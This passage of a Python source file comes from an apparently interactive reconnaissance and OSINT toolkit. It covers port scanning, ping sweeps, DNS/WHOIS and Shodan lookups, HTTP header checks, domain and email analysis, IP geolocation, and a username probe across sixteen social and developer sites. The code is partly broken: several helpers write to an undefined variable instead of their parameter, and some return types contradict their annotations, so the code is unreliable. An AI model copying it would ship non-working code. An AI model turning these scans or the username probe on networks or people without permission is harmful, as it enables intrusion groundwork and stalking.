                        print(f"  InternetDB sees   : {len(passive_ports)} open port(s)")
                        active_set  = {p for p, _ in open_ports}
                        only_active = sorted(active_set - passive_ports)
                        only_passive = sorted(passive_ports - active_set)
                        both        = sorted(active_set & passive_ports)

                        if both:
                            print(f"\n  Seen by both      : {', '.join(str(p) for p in both)}")
                        if only_active:
                            print(f"  Only in active    : {', '.join(str(p) for p in only_active)}")
                        if only_passive:
                            print(f"  Only in InternetDB: {', '.join(str(p) for p in only_passive)}")
                        if passive_cves:
                            print(f"\n  CVEs ({len(passive_cves)}): {', '.join(passive_cves[:8])}")
                        if passive_tags:
                            print(f"  Tags              : {', '.join(passive_tags)}")

                        report_lines += [
                            "", "InternetDB Passive Comparison:",
                            f"  Ports   : {', '.join(str(p) for p in sorted(passive_ports))}",
                            f"  CVEs    : {', '.join(passive_cves[:10])}",
                            f"  Tags    : {', '.join(passive_tags)}",
                        ]
                    elif idb.get("error") == "not_found":
                        print("  [i] No InternetDB data for this IP.")
                    else:
                        print(f"  [!] {idb['error']}")
                except Exception as e:
                    print(f"  [!] InternetDB query failed: {e}")

    report = "\n".join(report_lines)
    run_id = _save_tool_run("port_scan", host, summary, report)
    if run_id:
        print(f"\n  [+] Saved port scan to SQLite result #{run_id}.")
    if not open_ports:
        print("  [*] No open ports found in selected range.")
    input("\nPress Enter to return...")


def _ping_host(host: str, timeout_ms: int = 800) -> bool:
    system = platform.system().lower()
    if system == "windows":
        cmd = ["ping", "-n", "1", "-w", str(timeout_ms), str(host)]
    else:
        timeout_s = str(max(1, int(timeout_ms / 1000)))
        cmd = ["ping", "-c", "1", "-W", timeout_s, str(host)]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        return result.returncode == 0
    except Exception:
        return False


def run_ping_sweeper() -> None:
    """
    ICMP ping sweep across a subnet to discover live hosts.

    Accepts CIDR notation (e.g. 192.168.1.0/24) and pings every host
    address concurrently via the OS ping utility.  Results list responsive
    hosts with round-trip time.  For authorized use on networks you own
    or have explicit permission to test.
    """
    print_rule("Ping Sweeper")
    print("  Only sweep networks you own or have permission to test.\n")
    raw = input("  Subnet (example 192.168.1.0/24): ").strip()
    try:
        network = ipaddress.ip_network(raw, strict=False)
    except ValueError as e:
        print(f"  [!] Invalid subnet: {e}")
        input("\nPress Enter to return...")
        return

    hosts = list(network.hosts())
    if len(hosts) > 1024:
        print("  [!] Refusing to sweep more than 1,024 hosts at once.")
        input("\nPress Enter to return...")
        return

    live = []
    print(f"\n  [*] Sweeping {len(hosts)} hosts...")
    for host in hosts:
        if _ping_host(host):
            print(f"  [+] {host} is up")
            live.append(str(host))

    summary = f"{len(live)} live hosts"
    report = "\n".join([f"Ping sweep: {network}", summary] + live)
    run_id = _save_tool_run("ping_sweep", str(network), summary, report)
    if run_id:
        print(f"\n  [+] Saved ping sweep to SQLite result #{run_id}.")
    if not live:
        print("  [*] No hosts responded to ping.")
    input("\nPress Enter to return...")


def run_dns_whois_lookup() -> None:
    """
    WHOIS registration data and multi-record DNS lookup for a domain or IP.

    Resolves A, AAAA, MX, NS, TXT, and CNAME records via dnspython,
    retrieves WHOIS registration data via python-whois, and optionally
    enriches results with Shodan host data if an API key is configured.
    Results are saved to the SQLite results database.
    """
    print_rule("WHOIS / DNS Lookup")

    config     = _load_argus_config()
    shodan_key = config.get("shodan_key", "")

    if shodan_key:
        print("  [+] Shodan key loaded — resolved IPs will be enriched.")
    else:
        print("  [i] No Shodan key — using InternetDB to enrich resolved IPs (free).")
    print()

    domain = input("  Domain: ").strip()
    if not domain:
        print("  [!] Domain cannot be empty.")
        input("\nPress Enter to return...")
        return

    lines = [f"Lookup: {domain}", ""]
    resolved_ips = []
    try:
        import dns.resolver
        resolver = dns.resolver.Resolver()
        for record_type in ("A", "AAAA", "MX", "NS", "TXT", "CNAME"):
            try:
                answers = resolver.resolve(domain, record_type, lifetime=5)
                values = [str(answer).strip('"') for answer in answers]
                print(f"\n  {record_type} records:")
                lines.append(f"{record_type} records:")
                for value in values:
                    print(f"    {value}")
                    lines.append(f"  {value}")
                    if record_type in ("A", "AAAA"):
                        resolved_ips.append(value)
            except Exception:
                pass
    except ImportError:
        print("  [!] dnspython is not installed. Run: pip install dnspython")
        lines.append("dnspython not installed.")

    # ── Enrich resolved IPs with Shodan / InternetDB ──────────────────
    global_ips = []
    for ip_str in resolved_ips:
        try:
            if ipaddress.ip_address(ip_str).is_global:
                global_ips.append(ip_str)
        except Exception:
            pass

    if global_ips:
        sep = "=" * 56
        print(f"\n  {sep}")
        print(f"  IP ENRICHMENT ({len(global_ips)} address(es))")
        print(f"  {sep}")
        for ip_str in global_ips[:5]:
            print(f"\n  [{ip_str}]")
            lines.append(f"\nIP Enrichment: {ip_str}")
            if shodan_key:
                try:
                    sd = _ioc_query_shodan_host(ip_str, shodan_key)
                    if "error" not in sd:
                        ports   = sd.get("ports", [])
                        vulns   = sd.get("vulns") or {}
                        tags    = sd.get("tags") or []
                        org     = sd.get("org", "?")
                        isp     = sd.get("isp", "?")
                        country = sd.get("country_name", "?")
                        banners = sd.get("data") or []
                        print(f"  Org/ISP     : {org} / {isp}")
                        print(f"  Country     : {country}")
                        port_str = ", ".join(str(p) for p in sorted(ports)[:20]) or "none"
                        print(f"  Open ports  : {port_str}")
                        if tags:
                            print(f"  Tags        : {', '.join(tags)}")
                        if banners:
                            print("  Services:")
                            for svc in sorted(banners, key=lambda x: x.get("port", 0))[:6]:
                                prod = (f"{svc.get('product', '')} {svc.get('version', '')}").strip()
                                print(f"    {svc.get('port')}/{svc.get('transport','tcp'):<4} {prod or 'unknown'}")
                        if vulns:
                            cve_str = ", ".join(list(vulns.keys())[:6])
                            print(f"  CVEs ({len(vulns)}): {cve_str}")
                        lines += [
                            f"  Ports: {port_str}",
                            f"  CVEs : {', '.join(list(vulns.keys())[:10])}",
                        ]
                    elif sd.get("error") == "not_found":
                        print("  No Shodan data for this IP.")
                except Exception as e:
                    print(f"  [!] Shodan error: {_scrub_key(e, shodan_key)}")
            else:
                try:
                    idb = _ioc_query_internetdb(ip_str)
                    if "error" not in idb:
                        idb_ports = idb.get("ports", [])
                        idb_cves  = idb.get("vulns", [])
                        idb_tags  = idb.get("tags", [])
                        port_str  = ", ".join(str(p) for p in sorted(idb_ports)) or "none"
                        print(f"  Open ports  : {port_str}")
                        if idb_tags:
                            print(f"  Tags        : {', '.join(idb_tags)}")
                        if idb_cves:
                            print(f"  CVEs ({len(idb_cves)}): {', '.join(idb_cves[:6])}")
                        lines += [
                            f"  Ports: {port_str}",
                            f"  CVEs : {', '.join(idb_cves[:10])}",
                        ]
                    elif idb.get("error") == "not_found":
                        print("  No InternetDB data for this IP.")
                except Exception as e:
                    print(f"  [!] InternetDB error: {e}")


    print("\n  WHOIS:")
    try:
        import whois
        info = whois.whois(domain)
        for key in ("domain_name", "registrar", "creation_date", "expiration_date", "name_servers"):
            value = info.get(key) if hasattr(info, "get") else getattr(info, key, None)
            if value:
                print(f"    {key}: {value}")
                lines.append(f"{key}: {value}")
    except ImportError:
        whois_bin = shutil.which("whois")
        if whois_bin:
            try:
                result = subprocess.run([whois_bin, domain], capture_output=True, text=True, timeout=20)
                output = result.stdout[:3000]
                print(output or "    No WHOIS output.")
                lines.append(output)
            except Exception as e:
                print(f"    WHOIS command failed: {e}")
        else:
            print("    Optional WHOIS support needs: pip install python-whois")
            lines.append("WHOIS unavailable. Install python-whois.")
    except Exception as e:
        print(f"    WHOIS lookup failed: {e}")
        lines.append(f"WHOIS lookup failed: {e}")

    run_id = _save_tool_run("dns_whois", domain, "DNS/WHOIS lookup", "\n".join(lines))
    if run_id:
        print(f"\n  [+] Saved lookup to SQLite result #{run_id}.")
    input("\nPress Enter to return...")


def run_http_header_inspector() -> None:
    """
    Fetch and display all HTTP response headers for a given URL.

    Sends a GET request and prints every response header with colour-coded
    output highlighting security-relevant headers (HSTS, CSP, X-Frame-Options,
    etc.) versus informational or server-disclosure headers.
    """
    try:
        import requests
    except ImportError:
        print("\n  [!] requests is not installed. Run: pip install requests")
        input("\nPress Enter to return...")
        return

    print_rule("HTTP Header Inspector")
    url = _normalize_url(input("  URL: ").strip())
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True, headers={"User-Agent": _random_user_agent("Headers")})
    except Exception as e:
        print(f"  [!] Request failed: {e}")
        input("\nPress Enter to return...")
        return

    print(f"\n  HTTP {resp.status_code}  Final URL: {resp.url}")
    for key, value in resp.headers.items():
        print(f"  {key}: {value}")

    expected = [name for name, *_ in SECURITY_HEADERS]
    missing = [name for name in expected if not resp.headers.get(name)]
    if missing:
        print("\n  Missing common security headers:")
        for name in missing:
            print(f"    - {name}")
    else:
        print("\n  [+] Common security headers are present.")

    report = "\n".join([f"HTTP headers: {url}", f"Status: {resp.status_code}", ""] + [f"{k}: {v}" for k, v in resp.headers.items()] + ["", "Missing: " + ", ".join(missing)])
    run_id = _save_tool_run("headers", url, f"HTTP {resp.status_code}, {len(missing)} missing headers", report)
    if run_id:
        print(f"\n  [+] Saved header inspection to SQLite result #{run_id}.")
    input("\nPress Enter to return...")


def run_recon_tools() -> None:
    """
    Sub-menu hub for network reconnaissance tools.

    Routes to: port scanner, ping sweeper, WHOIS/DNS lookup, and HTTP
    header inspector.  All tools are for authorized use only.
    """
    while True:
        print_rule("Network & Recon Tools")
        print("  1. Port scanner")
        print("  2. Ping sweeper")
        print("  3. WHOIS / DNS lookup")
        print("  4. HTTP header inspector")
        print("  q. Back")
        choice = input("\n  Choice: ").strip().lower()
        if choice == "1":
            run_port_scanner()
        elif choice == "2":
            run_ping_sweeper()
        elif choice == "3":
            run_dns_whois_lookup()
        elif choice == "4":
            run_http_header_inspector()
        elif choice == "q":
            return
        else:
            print("  [!] Invalid choice.")


DISPOSABLE_EMAIL_DOMAINS = {
    "10minutemail.com", "guerrillamail.com", "mailinator.com",
    "tempmail.com", "temp-mail.org", "throwawaymail.com",
    "yopmail.com", "sharklasers.com", "getnada.com", "trashmail.com",
}

USERNAME_CHECK_SITES = [
    ("GitHub",        "https://github.com/{username}"),
    ("GitLab",        "https://gitlab.com/{username}"),
    ("Reddit",        "https://www.reddit.com/user/{username}/"),
    ("HackerOne",     "https://hackerone.com/{username}"),
    ("Keybase",       "https://keybase.io/{username}"),
    ("DEV Community", "https://dev.to/{username}"),
    ("Medium",        "https://medium.com/@{username}"),
    ("Pastebin",      "https://pastebin.com/u/{username}"),
    ("Product Hunt",  "https://www.producthunt.com/@{username}"),
    ("Telegram",      "https://t.me/{username}"),
    ("Instagram",     "https://www.instagram.com/{username}/"),
    ("X (Twitter)",   "https://x.com/{username}"),
    ("Snapchat",      "https://www.snapchat.com/add/{username}"),
    ("LinkedIn",      "https://www.linkedin.com/in/{username}/"),
    ("Hudl",          "https://www.hudl.com/profile/{username}"),
    ("Facebook",      "https://www.facebook.com/{username}"),
]


def _extract_domain(value: str) -> str:
    """Pull a hostname from a URL, email address, or plain domain string."""
    import urllib.parse

    raw = (value or "").strip().strip("<>\"' ,")
    if not raw:
        return ""
    if "@" in raw and not raw.lower().startswith(("http://", "https://")):
        raw = raw.rsplit("@", 1)[-1]
    candidate = raw if "://" in raw else "https://" + raw
    parsed = urllib.parse.urlparse(candidate)
    host = parsed.hostname or raw.split("/", 1)[0].split(":", 1)[0]
    return (host or "").strip(".").lower()


def _dns_records(domain: str, record_type: str, lifetime: int = 5) -> list[str]:
    try:
        import dns.resolver
    except ImportError:
        return [], "dnspython is not installed. Run: pip install dnspython"

    try:
        resolver = dns.resolver.Resolver()
        answers = resolver.resolve(domain, record_type, lifetime=lifetime)
        return [str(answer).strip('"') for answer in answers], None
    except dns.resolver.NoAnswer:
        return [], None
    except dns.resolver.NXDOMAIN:
        return [], "Domain does not exist."
    except dns.resolver.NoNameservers:
        return [], "No nameservers answered for this record type."
    except dns.exception.Timeout:
        return [], "DNS query timed out."
    except Exception as e:
        return [], str(e)


def _append_section(lines_out: list[str], title: str) -> None:
    print(f"\n  {title}:")
    lines.append("")
    lines.append(f"{title}:")


def _append_item(lines_out: list[str], text: str) -> None:
    print(f"    {text}")
    lines.append(f"  {text}")


def _save_osint_run(kind: str, target: str, summary: str, lines_out: list[str]) -> None:
    run_id = _save_tool_run(f"osint_{kind}", target, summary, "\n".join(lines))
    if run_id:
        print(f"\n  [+] Saved OSINT result to SQLite result #{run_id}.")


def _spf_analysis(txt_records: list[str]) -> str:
    spf = [record for record in txt_records if "v=spf1" in record.lower()]
    lines = []
    if not spf:
        return ["No SPF record found."]
    if len(spf) > 1:
        lines.append("Multiple SPF records found. DNS should publish only one SPF record.")
    record = spf[0]
    lines.append(record)
    lower = record.lower()
    if "-all" in lower:
        lines.append("Policy: hard fail (-all).")
    elif "~all" in lower:
        lines.append("Policy: soft fail (~all).")
    elif "?all" in lower:
        lines.append("Policy: neutral (?all).")
    elif "+all" in lower:
        lines.append("Policy: permissive (+all). Review carefully.")
    else:
        lines.append("Policy: no explicit all mechanism found.")
    mechanisms = [part for part in record.split() if part.startswith(("include:", "ip4:", "ip6:", "a", "mx"))]
    if mechanisms:
        lines.append("Mechanisms: " + ", ".join(mechanisms[:12]))
    return lines


def _dmarc_analysis(domain: str) -> str:
    records, err = _dns_records(f"_dmarc.{domain}", "TXT")
    dmarc = [record for record in records if "v=dmarc1" in record.lower()]
    if err and not dmarc:
        return [f"DMARC query issue: {err}"]
    if not dmarc:
        return ["No DMARC record found."]
    record = dmarc[0]
    parts = {}
    for item in record.split(";"):
        if "=" in item:
            key, value = item.strip().split("=", 1)
            parts[key.lower()] = value.strip()
    lines = [record, f"Policy: {parts.get('p', 'not specified')}"]
    if "sp" in parts:
        lines.append(f"Subdomain policy: {parts['sp']}")
    if "rua" in parts:
        lines.append(f"Aggregate reports: {parts['rua']}")
    if len(dmarc) > 1:
        lines.append("Multiple DMARC records found. Receivers may ignore policy.")
    return lines


def _whois_summary(domain: str) -> str:
    lines = []
    try:
        import whois
        info = whois.whois(domain)
        for key in ("domain_name", "registrar", "creation_date", "expiration_date", "updated_date", "name_servers"):
            value = info.get(key) if hasattr(info, "get") else getattr(info, key, None)
            if value:
                lines.append(f"{key}: {value}")
    except ImportError:
        whois_bin = shutil.which("whois")
        if not whois_bin:
            return ["WHOIS unavailable. Install python-whois or a whois command."]
        try:
            result = subprocess.run([whois_bin, domain], capture_output=True, text=True, timeout=20)
            output = (result.stdout or result.stderr or "").strip()
            lines.extend(output.splitlines()[:40] or ["No WHOIS output."])
        except Exception as e:
            lines.append(f"WHOIS command failed: {e}")
    except Exception as e:
        lines.append(f"WHOIS lookup failed: {e}")
    return lines or ["No WHOIS details returned."]


def _certificate_transparency_names(domain: str) -> list[str]:
    try:
        import requests
    except ImportError:
        return [], "requests is not installed. Run: pip install requests"

    try:
        resp = requests.get(
            "https://crt.sh/",
            params={"q": f"%.{domain}", "output": "json"},
            headers={"User-Agent": _random_user_agent("OSINT-CT")},
            timeout=20,
        )
        if resp.status_code != 200:
            return [], f"crt.sh returned HTTP {resp.status_code}"
        rows = resp.json()
    except Exception as e:
        return [], f"Certificate transparency query failed: {e}"

    names = set()
    for row in rows if isinstance(rows, list) else []:
        for name in str(row.get("name_value", "")).splitlines():
            clean = name.strip().lower().lstrip("*.").strip(".")
            if clean.endswith(domain):
                names.add(clean)
    return sorted(names), None


def run_osint_domain_lookup() -> None:
    """
    Passive domain intelligence: DNS, WHOIS, email security, and CT logs.

    Accepts a domain, URL, or email address and runs: multi-record DNS
    resolution, WHOIS registration lookup, SPF record analysis, DMARC
    policy check, and certificate transparency name enumeration via
    crt.sh.  All results are saved to the SQLite database.
    """
    print_rule("Domain OSINT")
    print("  Passive DNS, WHOIS, SPF/DMARC, and certificate transparency checks.\n")
    domain = _extract_domain(input("  Domain, URL, or email: "))
    if not domain:
        print("  [!] Domain cannot be empty.")
        input("\nPress Enter to return...")
        return

    lines = [f"Domain OSINT: {domain}"]
    dns_cache = {}
    _append_section(lines, "DNS Records")
    for record_type in ("A", "AAAA", "MX", "TXT", "NS", "SOA", "CAA"):
        values, err = _dns_records(domain, record_type)
        dns_cache[record_type] = values
        if values:
            _append_item(lines, f"{record_type}:")
            for value in values:
                _append_item(lines, f"  {value}")
        elif err:
            _append_item(lines, f"{record_type}: {err}")
        else:
            _append_item(lines, f"{record_type}: none found")

    _append_section(lines, "SPF Analysis")
    for item in _spf_analysis(dns_cache.get("TXT", [])):
        _append_item(lines, item)

    _append_section(lines, "DMARC Analysis")
    for item in _dmarc_analysis(domain):
        _append_item(lines, item)

    _append_section(lines, "WHOIS")
    for item in _whois_summary(domain):
        _append_item(lines, item)

    ans = input("\n  Query certificate transparency logs via crt.sh? (y/n) [y]: ").strip().lower() or "y"
    if ans == "y":
        _append_section(lines, "Certificate Transparency")
        names, err = _certificate_transparency_names(domain)
        if err:
            _append_item(lines, err)
        elif names:
            _append_item(lines, f"{len(names)} unique names found")
            for name in names[:100]:
                _append_item(lines, name)
            if len(names) > 100:
                _append_item(lines, f"... {len(names) - 100} more omitted from screen")
        else:
            _append_item(lines, "No certificate names returned.")

    # ── Shodan domain intelligence (optional, key required) ───────────
    domain_config  = _load_argus_config()
    domain_shodan_key = domain_config.get("shodan_key", "")
    if domain_shodan_key:
        ans_sh = input("\n  Query Shodan DNS for subdomain/host intelligence? (y/n) [y]: ").strip().lower() or "y"
        if ans_sh == "y":
            _append_section(lines, "Shodan Domain Intelligence")
            print("  [*] Querying Shodan DNS ...")
            try:
                sd = _ioc_query_shodan_domain(domain, domain_shodan_key)
                if "error" in sd:
                    if sd["error"] == "not_found":
                        _append_item(lines, "No Shodan data found for this domain.")
                        print("  [  i  ] No Shodan data found for this domain.")
                    else:
                        msg = _scrub_key(sd["error"], domain_shodan_key)
                        _append_item(lines, f"Shodan error: {msg}")
                        print(f"  [!] {msg}")
                else:
                    subdomains   = sd.get("subdomains", [])
                    data_entries = sd.get("data", [])

                    # Build a subdomain → IPs map from DNS data entries
                    sub_ip_map: dict = {}
                    for entry in data_entries:
                        sub  = entry.get("subdomain", "")
                        val  = entry.get("value", "")
                        typ  = entry.get("type", "")
                        if sub and val and typ in ("A", "AAAA"):
                            sub_ip_map.setdefault(sub, []).append(val)

                    print(f"  Subdomains found : {len(subdomains)}")
                    _append_item(lines, f"Shodan subdomains: {len(subdomains)}")

                    if subdomains:
                        print(f"\n  Subdomains (first {min(25, len(subdomains))}):")
                        for sub in subdomains[:25]:
                            fqdn   = f"{sub}.{domain}"
                            ips    = sub_ip_map.get(sub, [])
                            ip_str = f"  →  {', '.join(ips[:3])}" if ips else ""
                            print(f"    {fqdn}{ip_str}")
                            _append_item(lines, f"  {fqdn}{ip_str}")
                        if len(subdomains) > 25:
                            remaining = len(subdomains) - 25
                            print(f"    ... and {remaining} more")
                            _append_item(lines, f"  ... and {remaining} more")
                    else:
                        print("  [  i  ] No subdomains returned by Shodan.")
                        _append_item(lines, "No subdomains in Shodan DNS data.")

            except Exception as e:
                msg = _scrub_key(str(e), domain_shodan_key)
                print(f"  [!] Shodan domain query failed: {msg}")
                _append_item(lines, f"Shodan error: {msg}")

    _save_osint_run("domain", domain, "domain DNS/WHOIS/CT lookup", lines)
    input("\nPress Enter to return...")




def _ip_categories(ip: Any) -> list[str]:
    categories = []
    if ip.is_private:
        categories.append("private")
    if ip.is_loopback:
        categories.append("loopback")
    if ip.is_link_local:
        categories.append("link-local")
    if ip.is_reserved:
        categories.append("reserved")
    if ip.is_multicast:
        categories.append("multicast")
    if ip.is_global:
        categories.append("public")
    return categories or ["unclassified"]


def _query_ipwhois(ip_text: str) -> list[str]:
    try:
        import requests
    except ImportError:
        return ["requests is not installed. Run: pip install requests"]
    try:
        resp = requests.get(
            f"https://ipwho.is/{ip_text}",
            headers={"User-Agent": _random_user_agent("OSINT-IP")},
            timeout=8,
        )
        data = resp.json()
    except Exception as e:
        return [f"IP intelligence query failed: {e}"]
    if not data.get("success", False):
        return [f"IP intelligence service returned: {data.get('message', 'unknown error')}"]
    connection = data.get("connection") or {}
    return [
        f"Country/region: {data.get('country', 'unknown')} / {data.get('region', 'unknown')}",
        f"City: {data.get('city', 'unknown')}",
        f"ASN: {connection.get('asn', 'unknown')}",
        f"Organization: {connection.get('org', 'unknown')}",
        f"ISP: {connection.get('isp', 'unknown')}",
        f"Timezone: {(data.get('timezone') or {}).get('id', 'unknown')}",
    ]


def run_osint_ip_intelligence() -> None:
    """
    IP geolocation and ASN intelligence via ipwho.is.

    Resolves domains to IP if needed, then queries ipwho.is for country,
    region, city, ASN, ISP, and timezone.  Classifies the address as
    public, private, loopback, link-local, reserved, or multicast.
    Results are saved to the SQLite database.
    """
    print_rule("IP Intelligence")
    target = input("  IP address or domain: ").strip()
    if not target:
        print("  [!] Target cannot be empty.")
        input("\nPress Enter to return...")
        return

    lines = [f"IP Intelligence: {target}"]
    ips = []
    try:
        ips = [ipaddress.ip_address(target)]
    except ValueError:
        host = _extract_domain(target)
        try:
            resolved = socket.getaddrinfo(host, None)
            seen = set()
            for item in resolved:
                ip_text = item[4][0]
                if ip_text not in seen:
                    ips.append(ipaddress.ip_address(ip_text))
                    seen.add(ip_text)
        except Exception as e:
            print(f"  [!] DNS resolution failed: {e}")
            lines.append(f"DNS resolution failed: {e}")

    if not ips:
        _save_osint_run("ip", target, "no IPs resolved", lines)
        input("\nPress Enter to return...")
        return

    config     = _load_argus_config()
    shodan_key = config.get("shodan_key", "")

    for ip in ips[:10]:
        _append_section(lines, str(ip))
        _append_item(lines, "Categories: " + ", ".join(_ip_categories(ip)))
        try:
            reverse = socket.gethostbyaddr(str(ip))[0]
        except Exception:
            reverse = "none"
        _append_item(lines, f"Reverse DNS: {reverse}")
        if ip.is_global:
            for item in _query_ipwhois(str(ip)):
                _append_item(lines, item)

            # ── Shodan / InternetDB enrichment ────────────────────────
            ip_str = str(ip)
            if shodan_key:
                print(f"  [*] Querying Shodan for {ip_str} ...")
                try:
                    sd = _ioc_query_shodan_host(ip_str, shodan_key)
                    if "error" not in sd:
                        ports   = sd.get("ports", [])
                        vulns   = sd.get("vulns") or {}
                        banners = sd.get("data") or []
                        os_det  = sd.get("os") or "unknown"
                        tags    = sd.get("tags") or []
                        _append_item(lines, f"Shodan OS: {os_det}")
                        _append_item(lines, f"Shodan open ports ({len(ports)}): "
                                            + ", ".join(str(p) for p in sorted(ports)[:20]))
                        if tags:
                            _append_item(lines, f"Shodan tags: {', '.join(tags)}")
                        for svc in sorted(banners, key=lambda x: x.get("port", 0))[:10]:
                            prod = f"{svc.get('product','')} {svc.get('version','')}".strip()
                            if prod:
                                _append_item(lines, f"  {svc.get('port')}/{svc.get('transport','tcp')}: {prod}")
                        if vulns:
                            _append_item(lines, f"Shodan CVEs ({len(vulns)}): "
                                                + ", ".join(list(vulns.keys())[:10]))
                except Exception as e:
                    _append_item(lines, f"Shodan error: {_scrub_key(e, shodan_key)}")
            else:
                print(f"  [*] Querying InternetDB for {ip_str} ...")
                try:
                    idb = _ioc_query_internetdb(ip_str)
                    if "error" not in idb:
                        idb_ports = idb.get("ports", [])
                        idb_cves  = idb.get("vulns", [])
                        idb_cpes  = idb.get("cpes", [])
                        idb_tags  = idb.get("tags", [])
                        _append_item(lines, f"InternetDB ports: "
                                            + ", ".join(str(p) for p in sorted(idb_ports)))
                        if idb_tags:
                            _append_item(lines, f"InternetDB tags: {', '.join(idb_tags)}")
                        if idb_cpes:
                            for cpe in idb_cpes[:5]:
                                _append_item(lines, f"CPE: {cpe}")
                        if idb_cves:
                            _append_item(lines, f"CVEs ({len(idb_cves)}): "
                                                + ", ".join(idb_cves[:10]))
                except Exception as e:
                    _append_item(lines, f"InternetDB error: {e}")
        else:
            _append_item(lines, "Skipping external IP intelligence for non-public address.")

    _save_osint_run("ip", target, f"{len(ips)} IP address(es)", lines)
    input("\nPress Enter to return...")


def run_osint_email_analyzer() -> None:
    """
    Email address OSINT: format validation, domain DNS, and deliverability checks.

    Parses and validates the address format, resolves MX records for the
    domain, checks SPF and DMARC policy, and queries EmailRep.io for
    reputation data if an API key is configured.  Results are saved to
    the SQLite database.
    """
    print_rule("Email Analyzer")
    import email.utils

    raw = input("  Email address: ").strip()
    _name, address = email.utils.parseaddr(raw)
    if "@" not in address:
        print("  [!] Enter a valid email address.")
        input("\nPress Enter to return...")
        return
    local, domain = address.rsplit("@", 1)
    domain = domain.lower().strip(".")
    lines = [f"Email OSINT: {address}"]

    _append_item(lines, f"Local part length: {len(local)}")
    _append_item(lines, f"Domain: {domain}")
    _append_item(lines, f"Disposable domain: {'yes' if domain in DISPOSABLE_EMAIL_DOMAINS else 'not in local list'}")

    _append_section(lines, "MX Records")
    mx_records, err = _dns_records(domain, "MX")
    if mx_records:
        for record in mx_records:
            _append_item(lines, record)
    else:
        _append_item(lines, err or "No MX records found.")

    txt_records, _txt_err = _dns_records(domain, "TXT")
    _append_section(lines, "SPF Analysis")
    for item in _spf_analysis(txt_records):
        _append_item(lines, item)

    _append_section(lines, "DMARC Analysis")
    for item in _dmarc_analysis(domain):
        _append_item(lines, item)

    _save_osint_run("email", address, f"domain {domain}", lines)
    input("\nPress Enter to return...")


def _read_email_headers_from_user() -> str:
    path = input("  Header file path (blank=paste headers): ").strip().strip('"')
    if path:
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                return f.read(), path
        except OSError as e:
            print(f"  [!] Could not read file: {e}")
            return "", path
    print("  Paste headers below. End with a single '.' on its own line.")
    rows = []
    while True:
        row = input()
        if row == ".":
            break
        rows.append(row)
    return "\n".join(rows), "pasted headers"


def run_osint_email_header_analyzer() -> None:
    """
    Raw email header forensics: hop tracing, SPF/DKIM/DMARC, and spoofing checks.

    Accepts pasted headers or a .eml file path, then parses the full
    Received chain to trace routing hops and timestamps, verifies
    authentication results (SPF, DKIM, DMARC), and flags common
    spoofing indicators such as From/Reply-To mismatch.
    """
    print_rule("Email Header Analyzer")
    from email import policy
    from email.parser import Parser

    raw, source = _read_email_headers_from_user()
    if not raw.strip():
        print("  [!] No headers provided.")
        input("\nPress Enter to return...")
        return

    msg = Parser(policy=policy.default).parsestr(raw)
    lines = [f"Email Header Analysis: {source}"]
    for header in ("From", "To", "Reply-To", "Subject", "Date", "Message-ID", "Return-Path"):
        value = msg.get(header)
        if value:
            _append_item(lines, f"{header}: {value}")

    auth_results = msg.get_all("Authentication-Results", [])
    if auth_results:
        _append_section(lines, "Authentication Results")
        for item in auth_results:
            compact = " ".join(str(item).split())
            _append_item(lines, compact[:500])
        joined = " ".join(auth_results).lower()
        for marker in ("spf=", "dkim=", "dmarc="):
            matches = sorted(set(re.findall(rf"{marker}[a-z0-9_.-]+", joined)))
            if matches:
                _append_item(lines, f"{marker[:-1].upper()}: {', '.join(matches)}")

    received = msg.get_all("Received", [])
    _append_section(lines, "Mail Route")
    if not received:
        _append_item(lines, "No Received headers found.")
    else:
        for idx, hop in enumerate(reversed(received), 1):
            compact = " ".join(str(hop).split())
            ips = []
            for candidate in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", compact):
                try:
                    ipaddress.ip_address(candidate)
                    ips.append(candidate)
                except ValueError:
                    pass
            suffix = f" [IPs: {', '.join(sorted(set(ips)))}]" if ips else ""
            _append_item(lines, f"{idx}. {compact[:450]}{suffix}")

    _save_osint_run("email_headers", source, f"{len(received)} Received header(s)", lines)
    input("\nPress Enter to return...")


def run_osint_username_checker() -> None:
    """
    Passive username presence check across major public platforms.

    Probes well-known profile URL patterns concurrently using
    ThreadPoolExecutor.  HTTP 200 and 403 responses are flagged as
    likely-present leads for manual review; 404 is treated as absent.
    Does not log in or interact with any account.
    """
    print_rule("Username Checker")
    print("  Checks public profile URLs only. Treat 200/403/429 as leads for manual review.\n")
    username = input("  Username: ").strip()
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", username):
        print("  [!] Use 1-64 characters: letters, numbers, underscore, dot, or hyphen.")
        input("\nPress Enter to return...")
        return
    try:
        import requests
        import urllib.parse
    except ImportError:
        print("  [!] requests is not installed. Run: pip install requests")
        input("\nPress Enter to return...")
        return

    lines = [f"Username search: {username}"]
    encoded = urllib.parse.quote(username, safe="")
    session = requests.Session()
    session.headers.update({"User-Agent": _random_user_agent("OSINT-Username")})

    total       = len(USERNAME_CHECK_SITES)
    checked     = 0
    matches     = 0
    interrupted = False

    print(f"  [*] Checking {total} site(s)  (Ctrl-C to stop and save results so far)\n")

    for site, template in USERNAME_CHECK_SITES:
        url = template.format(username=encoded)
        try:
            resp   = session.get(url, timeout=8, allow_redirects=True)
            code   = resp.status_code
            if code == 404:
                status = "not found"
            elif code == 200:
                status = "possible match"
                matches += 1
            elif code in (301, 302):
                status = "redirected (manual check)"
                matches += 1
            elif code in (401, 403, 429):
                status = f"unknown (HTTP {code})"
            else:
                status = f"unknown (HTTP {code})"
        except KeyboardInterrupt:
            interrupted = True
            break
        except Exception as e:
            status = f"error: {e}"

        checked += 1
        _append_item(lines, f"{site}: {status} - {url}")

        # Live progress — overwrite same line each iteration
        bar_done  = int((checked / total) * 20)
        bar_str   = "█" * bar_done + "░" * (20 - bar_done)
        print(
            f"\r  [{bar_str}] {checked}/{total}  matches: {matches}  "
            f"current: {site[:28]:<28}",
            end="", flush=True,
        )

    print()   # newline after the progress bar

    if interrupted:
        print(f"\n  [*] Stopped after {checked}/{total} site(s) — {matches} potential match(es) found.")
    else:
        print(f"\n  [+] Done — {checked} site(s) checked, {matches} potential match(es) found.")

    _save_osint_run("username", username, "public profile URL checks", lines)
    input("\nPress Enter to return...")


def _rational_to_float(value: Any) -> float:
    try:
        return float(value)
    except Exception:
        if isinstance(value, tuple) and len(value) == 2 and value[1]:
            return value[0] / value[1]
        raise


